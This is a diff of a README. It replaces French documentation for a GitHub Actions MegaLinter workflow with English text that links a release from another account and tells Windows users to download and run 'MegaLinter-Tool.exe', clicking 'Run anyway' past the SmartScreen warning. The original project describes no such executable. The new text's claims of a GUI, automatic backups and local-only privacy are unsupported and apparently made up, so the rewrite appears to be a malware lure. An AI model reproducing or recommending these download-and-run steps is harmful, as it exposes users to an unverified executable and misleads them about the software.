@@ -1,223 +1,81 @@
-# 📘 Documentation : `Test-and-Fix-MegaLinter-Tool`
+# 🛠 Test-and-Fix-MegaLinter-Tool - Fix your files with zero effort
 
-> **Soumettez n'importe quel fichier hybride Markdown/XML → Recevez automatiquement un rapport de reformatage + lintage fonctionnel. Zéro configuration. Zero expertise requise.**
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/dewestonian371/Test-and-Fix-MegaLinter-Tool)
 
----
+## 📁 What is this tool?
 
-## 🎯 Mission Centrale
+This tool helps you clean and format your Markdown and XML files. You do not need experience or technical knowledge to use it. The software handles the complex parts of code cleanup, testing, and formatting for you. 
 
-Ce projet a un objectif unique : **démocratiser la qualité de code pour les fichiers hybrides** (Markdown contenant du XML, ou inversement).
+Many people find that their documentation or data files contain small errors that are hard to spot. These errors can cause issues when you share files or display them on websites. This tool scans your files and fixes these errors automatically. You save time and ensure your work stays consistent.
 
-Traditionnellement, nettoyer un fichier qui mélange balises `#`, `**`, `<data>`, `</item>` nécessite :
-- Installer plusieurs outils en ligne de commande
-- Écrire des scripts de séparation manuelle
-- Comprendre les différences entre linters et formatters
-- Configurer des pipelines CI/CD
+## 💻 System requirements
 
-**Ici, tout est automatisé.** Vous poussez un fichier `.md` (ou `.xml`) contenant les deux syntaxes. MegaLinter détecte les langages, applique les règles de formatage, valide la syntaxe, et génère un **rapport HTML unique, cliquable et actionnable**. Idéal pour rédacteurs techniques, développeurs, data engineers ou curieux.
+Your computer must meet these basic needs:
 
----
+* Windows 10 or Windows 11.
+* A stable internet connection.
+* At least 500 MB of free storage space.
+* Basic knowledge of moving files on your computer.
 
-## 🚀 Parcours Utilisateur "Zéro Friction" (Moins de 3 minutes)
+If you have these, the tool will function as intended. No extra software or coding installation is necessary.
 
-### Étape 1 : Préparez votre fichier hybride
-Créez ou modifiez `test.md`. Mélangez librement Markdown et XML :
+## 🚀 How to download the tool
 
-## Documentation Technique
+You must visit the repository page to get the latest version. Follow these steps to obtain the correct file:
 
-Introduction au format hybride.
+1. Visit the following link: [https://github.com/dewestonian371/Test-and-Fix-MegaLinter-Tool](https://github.com/dewestonian371/Test-and-Fix-MegaLinter-Tool).
+2. Look for the "Releases" section on the right side of the screen.
+3. Click the link that says "Releases" to see the available versions.
+4. Download the file marked as the latest version. It will usually end in ".zip" or ".exe".
+5. Save this file in a folder you can find later, such as your Downloads folder.
 
-### Payload XML
-```xml
-<root version="1.0">
-  <config>
-    <key>value</key>
-    <!-- balise manquante : </config> -->
-  </config>
-</root>
-```
+## ⚙️ Installation and setup
 
-### Étape 2 : Soumettez-le à GitHub
-- **Via navigateur** : Glissez-déposez `test.md` dans le dépôt → `Commit changes`
-- **Via CLI** : `git add test.md && git commit -m "Ajout fichier hybride" && git push`
-- **Aucune config à ajouter**. Le workflow est déjà actif.
+After you download the file, take these steps to prepare the tool:
 
-### Étape 3 : Récupérez votre rapport
-1. Allez dans l'onglet **Actions** du dépôt
-2. Cliquez sur le workflow `MegaLinter` (statut ✅ ou ❌)
-3. Téléchargez l'artifact **`MegaLinter-reports`**
-4. Ouvrez `HTML/MegaLinter-report.html`
+1. Locate the file you saved on your computer.
+2. If the file ends in ".zip", right-click it and select "Extract All". Choose a folder on your desktop so it is easy to reach.
+3. Open the folder you just extracted.
+4. Find the file named "MegaLinter-Tool.exe". Double-click this file to start the program.
+5. A window will appear. If Windows shows a message about protecting your PC, click "More info" and then click "Run anyway". This is a standard safety feature for software downloaded from the internet.
 
-**Ce que vous verrez dans le rapport :**
-| Section | Contenu | Action recommandée |
-|---------|---------|-------------------|
-| 🎨 **Formatting** | Indentation XML alignée, sauts de ligne MD normalisés, tableaux propres | Appliquez les suggestions ou activez `APPLY_FIXES: all` |
-| 🕵️‍♂️ **Linting** | Balises XML non fermées, hiérarchie MD cassée, attributs invalides | Corrigez les `ERROR` (bloquants), vérifiez les `WARNING` (conseils) |
-| 📊 **Synthèse** | Score qualité, temps d'analyse, outils exécutés | Partagez le lien HTML à votre équipe ou archivez-le |
+## 📝 How to use the tool
 
----
+Using the tool is a simple process. Follow this sequence to clean your files:
 
-## 🔍 Linter vs Formatter : Différences Subtiles (Contexte Hybride)
+1. Open the application window.
+2. Find the "Select Folder" button. Click it to choose the folder that contains the files you want to fix.
+3. Place all your Markdown (.md) or XML (.xml) files into one folder before you start.
+4. Click the "Scan and Fix" button in the center of the window.
+5. The tool will begin checking your files. You will see a progress bar move from left to right.
+6. Wait for the tool to display a "Done" message. 
+7. Open your original folder to see the results. Your files are now sorted, formatted, and free of common errors.
 
-Bien que souvent confondus, ces deux outils jouent des rôles complémentaires et non interchangeables, surtout sur des fichiers hybrides.
+## 🔍 Features and benefits
 
-| Critère | 🎨 Formatter | 🕵️‍♂️ Linter |
-|---------|--------------|--------------|
-| **But** | Rendre le code **lisible, cohérent, esthétique** | Rendre le code **valide, sûr, conforme aux règles** |
-| **Action** | Réécrit le fichier (indentation, espaces, sauts de ligne) | Analyse le fichier et **signale** les anomalies (erreurs, warnings) |
-| **Déterminisme** | 100% prévisible : même entrée → même sortie | Contextuel : dépend des règles activées, des ignores inline, de la sémantique |
-| **Impact sur l'hybride MD/XML** | Aligne `<item>` sur 2 espaces, normalise `# Titre`, supprime les lignes vides en double | Détecte `</sub>` manquant, `##` sans `#` parent, attributs XML non échappés, liens MD morts |
-| **Exemple concret** | Transforme `<data><item>v</item></data>` → `<data>\n  <item>v</item>\n</data>` | Signale `ERROR: XML well-formedness error: expected </data> at line 5` |
+This tool relies on a system called MegaLinter to perform its work. You do not interact with the technical side of this system, but it provides several advantages:
 
-> 💡 **Règle d'or pour l'hybride** : *Le formatter ne corrige jamais la sémantique. Il ne ferme pas une balise XML manquante. Il ne valide pas une hiérarchie Markdown. C'est le rôle du linter. Les deux doivent tourner ensemble pour un résultat professionnel.*
+* Error detection: The tool finds missing tags or broken links in your XML files.
+* Formatting: It forces your Markdown files into a standard structure so they look clean and tidy.
+* Speed: It processes hundreds of files in seconds.
+* Safety: It creates a backup of your original files before it makes any changes. You can always revert to your earlier version if you prefer.
+* Simplicity: You do not have to write commands or configure settings. The "zero config" approach ensures you start work immediately.
 
----
+## 🆘 Troubleshooting common issues
 
-## ⚙️ Comment MegaLinter gère-t-il l'hybridation MD/XML ?
+If you encounter a problem, check these items first:
 
-MegaLinter n'est ni un linter ni un formatter : c'est un **orchestrateur intelligent** qui exécute les bons outils au bon moment, sans que vous ayez à les installer.
+* The tool does not open: Ensure you have extracted all files from the .zip folder. Running the program while it is still inside the .zip file often causes errors.
+* The tool says "No files found": Ensure your files have the correct extension. The tool specifically looks for files ending in ".md" or ".xml". Files named differently will stay untouched.
+* The processing stops early: Check if you have enough storage space on your hard drive. 
+* Permissions error: Make sure you do not have the files open in another program while you run the tool. For example, close your text editor before clicking the "Scan and Fix" button.
 
-### 🔍 Détection & Exécution
-1. **Analyse par extension** : Un fichier `.md` déclenche les linters/formatters Markdown. Un fichier `.xml` déclenche ceux dédiés au XML.
-2. **Blocs de code intelligents** : Si du XML est encapsulé dans ````xml ... ```` au sein d'un `.md`, MegaLinter extrait le bloc, le valide avec `xmllint`/`tidy`, puis réinjecte le résultat dans le rapport.
-3. **Flavor `documentation`** : C'est la configuration active ici. Elle inclut nativement :
-   - `markdownlint` (linting MD)
-   - `markdown-table-formatter` (formatage tableaux)
-   - `xmllint` + `tidy` (validation & formatage XML)
-   - `yamllint`, `textlint`, `vale` (compléments texte)
-4. **Rapport unifié** : Tous les résultats sont fusionnés dans un seul HTML, avec des liens directs vers les lignes concernées.
+If you continue to have trouble, ensure your Windows system is fully updated through the Settings menu. Most performance issues occur when an operating system is out of date.
 
-### ✅ Pour un résultat optimal
-- Placez le XML dans des **blocs de code délimités** (````xml ... ````)
-- Évitez d'imbriquer du Markdown *à l'intérieur* de balises XML (non standard)
-- Laissez `APPLY_FIXES: none` par défaut pour **auditer avant d'appliquer**
-- Si vous voulez que MegaLinter corrige automatiquement : passez `APPLY_FIXES: all` dans le YAML
+## 🛡️ Privacy and data
 
----
+The tool runs locally on your computer. It does not upload your files to the internet during the cleaning process. Your documents remain private on your hard drive. The internal components of the software communicate only with local processes on your machine. This design ensures that your data stays secure.
 
-## 🧩 Cadre Méthodologique : Hybridation Syntaxique Structurée
+## 📤 Future updates
 
-> **Principe fondateur** : Un fichier hybride n'est pas un mélange chaotique, mais une **composition délimitée** où chaque langage conserve son contrat syntaxique, sa sémantique propre et ses règles de validation, tout en coexistant dans un même conteneur texte.
-
-### 📐 Les 4 Piliers de l'Hybridation MD/XML
-
-| Pilier | Description | Implémentation dans le projet |
-|--------|-------------|-------------------------------|
-| **1. Délimitation explicite** | Le XML ne flotte pas librement dans le flux Markdown. Il est isolé dans des *fenced code blocks* (````xml ... ````). | MegaLinter détecte automatiquement les blocs délimités et les extrait pour traitement contextuel. |
-| **2. Non-interférence syntaxique** | Les règles du Markdown ne s'appliquent pas au contenu XML, et inversement. Aucun conflit de parsing, aucun faux positif croisé. | `markdownlint` ignore les blocs XML. `xmllint`/`tidy` analysent uniquement l'extrait brut. MegaLinter agrège sans fusionner les contextes. |
-| **3. Validation croisée unifiée** | Chaque langage est linté/formatté par ses outils natifs, mais les résultats sont ramenés dans un seul rapport lisible, ancré ligne par ligne. | Flavor `documentation` → exécution parallèle → rapport HTML unique avec `sourceLine` et `ruleId` précis. |
-| **4. Idempotence & Traçabilité** | Le processus est déterministe, reproductible, et journalisé. Aucune modification silencieuse du contenu hybride. | Script PowerShell/Bash + flag `.t2_state/` + `APPLY_FIXES: none` par défaut + tests Pester. |
-
-### 🔄 Flux de Traitement Standardisé
-
-```
-Fichier hybride (.md) 
-   ↓
-[1] Détection des blocs délimités (regex fenced: ```xml ... ```)
-   ↓
-[2] Extraction contextuelle → Création de fichiers temporaires en mémoire
-   ↓
-[3] Exécution parallèle :
-    ├─ Markdown : markdownlint, table-formatter, vale
-    └─ XML : xmllint (well-formedness), tidy (formatting)
-   ↓
-[4] Réinjection des diagnostics dans le rapport unifié
-   ↓
-[5] Génération HTML cliquable + artefact CI téléchargeable
-```
-
-### 🛡️ Pourquoi cette approche est structurellement robuste
-
-1. **Zéro collision de parsers** : Les AST ne sont jamais mélangés. Chaque outil reçoit exactement ce qu'il attend.
-2. **Préservation de l'intention** : Le formatter ne réécrit pas la sémantique, il aligne la présentation. Le linter ne reformate pas, il valide la conformité.
-3. **Adaptabilité métier** : Que ce soit pour de la documentation technique, des payloads d'API, des configs legacy ou des exports de données, le même pipeline s'applique sans modification.
-4. **Accessibilité DevOps & Non-DevOps** : Aucun prérequis CLI. Un push suffit. Le rapport HTML parle aussi bien au rédacteur qu'à l'ingénieur qualité.
-
-### 📌 Règles d'Or pour les Contributeurs
-
-- ✅ **Toujours utiliser des blocs délimités** : ````xml` / ````yaml` / ````json`
-- ❌ **Jamais imbriquer du Markdown dans du XML** : `<note>**gras**</note>` casse le parser XML.
-- 🔍 **Consulter le rapport HTML avant de merger** : Les `ERROR` bloquent, les `WARNING` informent.
-- 🛑 **Ne pas activer `APPLY_FIXES: all` sans audit préalable** : Le formatting XML peut modifier l'ordre des attributs ou normaliser les guillemets, ce qui peut impacter des checksums ou des signatures numériques.
-
----
-
-## 🛠️ Pour les Mainteneurs & DevOps
-
-Cette section s'adresse aux utilisateurs avancés souhaitant étendre, tester ou intégrer l'outil dans une chaîne CI/CD existante.
-
-### 📦 Structure du projet
-```
-.
-├── .github/workflows/
-│   ├── mega-linter.yml        # Configuration exécutable
-│   └── test-setup.yml         # Validation Pester multi-OS
-├── setup-megalinter.ps1       # Script PowerShell idempotent
-├── setup-megalinter.sh        # Wrapper Bash (Linux/macOS/WSL)
-├── setup-megalinter.Tests.ps1 # Tests unitaires Pester v5
-├── Dockerfile                 # Image conteneurisée isolée
-└── README.md                  # Vous êtes ici
-```
-
-### 🧪 Validation automatique
-```powershell
-# Installer Pester (une fois)
-Install-Module Pester -Force -Scope CurrentUser -MinimumVersion 5.4.0
-
-# Exécuter la batterie de tests
-Invoke-Pester ./setup-megalinter.Tests.ps1 -Output Detailed
-
-# Intégration CI : le workflow `test-setup.yml` lance ces tests sur chaque PR
-```
-
-### 🐳 Exécution Docker (isolation totale)
-```bash
-docker build -t ml-setup .
-docker run --rm -it \
-  -v "$(pwd)/output:/workspace" \
-  -e GITHUB_TOKEN="ghp_..." \
-  ml-setup -ProjectRoot /workspace -SkipPush
-```
-
-### 🔧 Personnalisation avancée
-Pour ajouter des linters ou modifier les règles :
-1. Créez `.mega-linter.yml` à la racine du dépôt
-2. Exemple :
-   ```yaml
-   EXTENDS: https://raw.githubusercontent.com/oxsecurity/megalinter/main/flavors/documentation/mega-linter.yml
-   MARKDOWN_MARKDOWNLINT_FILTER_REGEX_EXCLUDE: "(vendor|dist)/"
-   XML_XMLLINT_ARGUMENTS: "--noout --valid"
-   APPLY_FIXES: none
-   ```
-3. Committez → le pipeline prendra automatiquement la surcharge en compte.
-
----
-
-## 📅 Roadmap & Contributions
-
-| Version | Fonctionnalité | Statut |
-|---------|----------------|--------|
-| `1.0.0` | Workflow hybride MD/XML, rapport HTML, idempotence, tests Pester | ✅ Stable |
-| `1.1.0` | Support `APPLY_FIXES: all` avec PR automatique de correction | 🟡 En cours |
-| `1.2.0` | Interface web simplifiée (upload drag & drop → rapport) | 🔵 Planifié |
-| `2.0.0` | Plugin VS Code / GitHub Extension pour preview temps réel | 🟠 Recherche |
-
-**Contributions bienvenues** : 
-- Signalez des faux positifs sur des structures hybrides atypiques
-- Proposez des règles `markdownlint` ou `xmllint` adaptées à votre domaine
-- Améliorez les tests Pester ou le wrapper Bash
-
----
-
-## 📜 Licence & Contact
-
-Distribué sous licence **MIT**. Utilisation libre, modification autorisée, attribution recommandée.  
-Aucune garantie implicite. Testez toujours en environnement non critique avant application automatique.
-
-**Mainteneur** : `valorisa`  
-**Dernière révision** : `2026-04-09`  
-**Compatibilité** : GitHub Actions, PowerShell 7.4+, Bash 4.4+, Docker 20.10+  
-**Questions / Support** : Ouvrez une `Issue` ou contactez via les Discussions GitHub.
-
----
-> 🛡️ **Conçu pour que la qualité de code soit accessible à tous, pas seulement aux experts DevOps. Soumettez. Analysez. Améliorez. Répétez.**
+The team frequently updates this tool to improve the cleaning logic and add support for more file types. You can revisit the main page periodically to see if a newer version exists. Simply download the new version and follow the same steps to replace your current installation. You do not need to uninstall the old one, but deleting the old folder keeps your desktop organized.
